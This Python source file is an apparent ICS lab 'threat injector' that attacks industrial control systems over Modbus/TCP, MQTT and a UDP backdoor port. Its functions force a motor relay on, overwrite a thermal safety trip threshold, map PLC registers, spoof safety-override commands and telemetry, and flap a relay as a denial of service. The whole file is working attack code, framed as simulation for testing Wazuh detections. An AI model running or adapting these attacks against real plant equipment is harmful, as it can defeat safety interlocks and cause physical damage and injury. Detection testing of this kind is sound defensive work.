"""
==============================================================================================
 PROJECT: ICS Laboratory - OT Adversary Simulation Tool
 MODULE: Hybrid Modbus/TCP & MQTT Threat Injector
 AUTHOR: Chinmayi Bhise
 GROUNDING: Real-World OT Attacks (Triton, Stuxnet, Oldsmar, Industroyer, Aurora)
 PROTOCOLS: Modbus/TCP (Port 502), MQTT (Port 1883), UDP Backdoor (Port 8888)
==============================================================================================
"""

import sys
import time
import socket
import struct
import json
import argparse

try:
    import paho.mqtt.client as mqtt
except ImportError:
    print("[!] Error: paho-mqtt not installed. Run: pip install paho-mqtt")
    sys.exit(1)


class OTThreatInjector:
    def __init__(self, broker="127.0.0.1", mqtt_port=1883, plc_ip="127.0.0.1", modbus_port=502, plc_udp_port=8888):
        self.broker = broker
        self.mqtt_port = mqtt_port
        self.plc_ip = plc_ip
        self.modbus_port = modbus_port
        self.plc_udp_port = plc_udp_port
        self.mqtt_client = mqtt.Client(client_id="ADVERSARY_WORKSTATION", protocol=mqtt.MQTTv311)

    def connect_mqtt(self):
        try:
            self.mqtt_client.connect(self.broker, self.mqtt_port, 60)
            print(f"[+] Connected to OT MQTT Broker at {self.broker}:{self.mqtt_port}")
            return True
        except Exception:
            return False

    # --------------------------------------------------------------------------
    # MODBUS/TCP ATTACK SUITE (Industrial Protocol - TCP Port 502)
    # --------------------------------------------------------------------------
    def _send_modbus_raw(self, pdu_bytes):
        """Sends a raw Modbus/TCP frame and returns response."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3.0)
        try:
            sock.connect((self.plc_ip, self.modbus_port))
            # Build MBAP Header: TxID=1, Proto=0, Len=len(PDU)+1, UnitID=1
            mbap = struct.pack(">HHHB", 0x0001, 0x0000, len(pdu_bytes) + 1, 0x01)
            sock.sendall(mbap + pdu_bytes)
            resp = sock.recv(260)
            return resp
        except Exception as e:
            print(f"[-] Modbus connection to {self.plc_ip}:{self.modbus_port} failed: {e}")
            return None
        finally:
            sock.close()

    def attack_modbus_fc05_force_motor_on(self):
        """FC 05: Force Single Coil 00001 ON (0xFF00) - Industroyer T0855"""
        print(f"\n[*] [MODBUS/TCP] Injecting FC 05 (Write Single Coil) -> Force Coil 00001 (Motor Relay) ON...")
        # PDU: FC=5, Addr=0x0000, Val=0xFF00
        pdu = struct.pack(">BHH", 0x05, 0x0000, 0xFF00)
        resp = self._send_modbus_raw(pdu)
        if resp:
            print(f"[+] Modbus FC 05 executed successfully! Relay commanded ON directly at hardware register.")
            print("    Check Wazuh SIEM / SOC Sensor for Modbus Actuation Alert (T0855).")

    def attack_modbus_fc06_tamper_threshold(self, threshold_c=999.0):
        """FC 06: Preset Single Register 40001 (Threshold * 10) - Stuxnet/Oldsmar T0836"""
        reg_val = int(threshold_c * 10)
        print(f"\n[*] [MODBUS/TCP] Injecting FC 06 (Write Holding Register) -> Setpoint Register 40001 to {threshold_c} C ({reg_val})...")
        pdu = struct.pack(">BHH", 0x06, 0x0000, reg_val)
        resp = self._send_modbus_raw(pdu)
        if resp:
            print(f"[+] Modbus FC 06 preset applied! Thermal safety trip limits blinded.")
            print("    Check Wazuh SIEM / SOC Sensor for Setpoint Tampering Alert (T0836).")

    def attack_modbus_recon_scan(self):
        """FC 01, 02, 03, 04: Full Modbus Register & Coil Enumeration - T0802"""
        print(f"\n[*] [MODBUS/TCP] Conducting Automated Modbus Register Discovery (T0802)...")
        # Read Coils (FC 01)
        resp_coils = self._send_modbus_raw(struct.pack(">BHH", 0x01, 0, 2))
        # Read Discrete Inputs (FC 02)
        resp_inputs = self._send_modbus_raw(struct.pack(">BHH", 0x02, 0, 2))
        # Read Input Registers (FC 04)
        resp_regs = self._send_modbus_raw(struct.pack(">BHH", 0x04, 0, 4))
        # Read Holding Registers (FC 03)
        resp_hold = self._send_modbus_raw(struct.pack(">BHH", 0x03, 0, 1))

        print("[+] Discovery Complete! Extracted Plant Memory Map:")
        if resp_coils and len(resp_coils) >= 10:
            print(f"    • Coil 00001 (Motor Relay): {'ON' if resp_coils[9] & 1 else 'OFF'}")
        if resp_inputs and len(resp_inputs) >= 10:
            print(f"    • Discrete Input 10001 (IR Obstacle): {'TRIPPED' if resp_inputs[9] & 1 else 'CLEAR'}")
        if resp_regs and len(resp_regs) >= 17:
            temp = ((resp_regs[9] << 8) | resp_regs[10]) / 10.0
            hum = ((resp_regs[11] << 8) | resp_regs[12]) / 10.0
            print(f"    • Input Reg 30001 (Temperature): {temp} °C | Reg 30002 (Humidity): {hum} %")
        if resp_hold and len(resp_hold) >= 11:
            thresh = ((resp_hold[9] << 8) | resp_hold[10]) / 10.0
            print(f"    • Holding Reg 40001 (Trip Threshold): {thresh} °C")

    # --------------------------------------------------------------------------
    # MQTT ATTACK SUITE (IIoT Protocol - TCP Port 1883)
    # --------------------------------------------------------------------------
    def attack_mqtt_triton_safety_bypass(self):
        print("\n[*] [MQTT] Executing TRITON / TRISIS Safety Interlock Override (T0888)...")
        self.mqtt_client.publish("plant/commands", json.dumps({"motor": 1}))
        self.mqtt_client.publish("plant/telemetry", json.dumps({
            "plant_id": "PLANT_ALPHA", "temp": 28.5, "hum": 52.0,
            "motor": 1, "relay": 1, "alarm": 1, "ir_obstacle": 1,
            "power": 4.5, "pressure": 8.2, "threshold": 30.0
        }))
        print("[+] MQTT safety bypass sequence sent! Check Wazuh Rule 100201.")

    def attack_mqtt_oldsmar_setpoint(self, value=999999.0):
        print(f"\n[*] [MQTT] Executing Oldsmar Setpoint Manipulation (T0836) -> {value} C...")
        self.mqtt_client.publish("plant/config", json.dumps({"threshold": value}))
        print("[+] Tampered setpoint injected! Check Wazuh Rule 100202.")

    def attack_mqtt_aurora_flapping(self, cycles=6):
        print(f"\n[*] [MQTT] Executing Aurora Generator Relay Flapping DoS (T0814)...")
        for i in range(cycles):
            self.mqtt_client.publish("plant/commands", json.dumps({"motor": i % 2}))
            time.sleep(0.3)
        print("[+] High-frequency cycle burst complete! Check Wazuh Rule 100207.")

    def attack_udp_backdoor(self, command="SABOTAGE"):
        print(f"\n[*] [DIRECT UDP] Triggering PLC Hardware Backdoor Port 8888 (T0859)...")
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(command.encode('utf-8'), (self.plc_ip, self.plc_udp_port))
        sock.close()
        print(f"[+] Datagram '{command}' transmitted directly to PLC! Check Wazuh Rule 100203.")


def show_menu():
    print("""
===================================================================
      HYBRID OT THREAT INJECTOR - ICS LABORATORY (CHINMAYI BHISE)
===================================================================
 [MODBUS/TCP EXPLOITATION - PORT 502]
  [1] Modbus FC 05: Force Motor Coil 00001 ON (Industroyer T0855)
  [2] Modbus FC 06: Tamper Threshold Register 40001 (Oldsmar T0836)
  [3] Modbus FC 01-04: Automated Memory Map Reconnaissance (T0802)

 [MQTT EXPLOITATION - PORT 1883]
  [4] MQTT TRITON: Safety Interlock Override (T0888)
  [5] MQTT OLDSMAR: Extreme Setpoint Manipulation (T0836)
  [6] MQTT AURORA: Actuator Relay Flapping DoS (T0814)

 [OUT-OF-BAND HARDWARE EXPLOITATION]
  [7] Direct UDP Backdoor Port 8888 (T0859)
  [8] Run Complete Automated Multi-Vector Attack Suite
  [0] Exit
===================================================================
    """)


def main():
    parser = argparse.ArgumentParser(description="Hybrid Modbus/TCP & MQTT Threat Injector")
    parser.add_argument("--broker", default="127.0.0.1", help="MQTT Broker IP")
    parser.add_argument("--mqtt-port", type=int, default=1883, help="MQTT Port")
    parser.add_argument("--plc-ip", default="127.0.0.1", help="PLC IP for Modbus/TCP & UDP")
    parser.add_argument("--modbus-port", type=int, default=502, help="Modbus/TCP Port")
    parser.add_argument("--plc-udp-port", type=int, default=8888, help="PLC UDP Backdoor Port")
    parser.add_argument("--attack", type=int, help="Attack ID (1-8)")
    args = parser.parse_args()

    injector = OTThreatInjector(
        broker=args.broker,
        mqtt_port=args.mqtt_port,
        plc_ip=args.plc_ip,
        modbus_port=args.modbus_port,
        plc_udp_port=args.plc_udp_port
    )

    injector.connect_mqtt()

    choice = str(args.attack) if args.attack else None
    if not choice:
        show_menu()
        choice = input("Select Attack Vector [0-8]: ").strip()

    if choice == "1":
        injector.attack_modbus_fc05_force_motor_on()
    elif choice == "2":
        injector.attack_modbus_fc06_tamper_threshold()
    elif choice == "3":
        injector.attack_modbus_recon_scan()
    elif choice == "4":
        injector.attack_mqtt_triton_safety_bypass()
    elif choice == "5":
        injector.attack_mqtt_oldsmar_setpoint()
    elif choice == "6":
        injector.attack_mqtt_aurora_flapping()
    elif choice == "7":
        injector.attack_udp_backdoor()
    elif choice == "8":
        print("\n[+] Launching Complete Multi-Vector Attack Suite...")
        injector.attack_modbus_recon_scan()
        time.sleep(1)
        injector.attack_modbus_fc05_force_motor_on()
        time.sleep(1)
        injector.attack_modbus_fc06_tamper_threshold()
        time.sleep(1)
        injector.attack_mqtt_triton_safety_bypass()
        time.sleep(1)
        injector.attack_mqtt_aurora_flapping()
        time.sleep(1)
        injector.attack_udp_backdoor()
        print("\n[+] All Modbus and MQTT attack scenarios completed!")
    elif choice == "0":
        print("[*] Exiting.")
    else:
        print("[!] Invalid selection.")


if __name__ == "__main__":
    main()
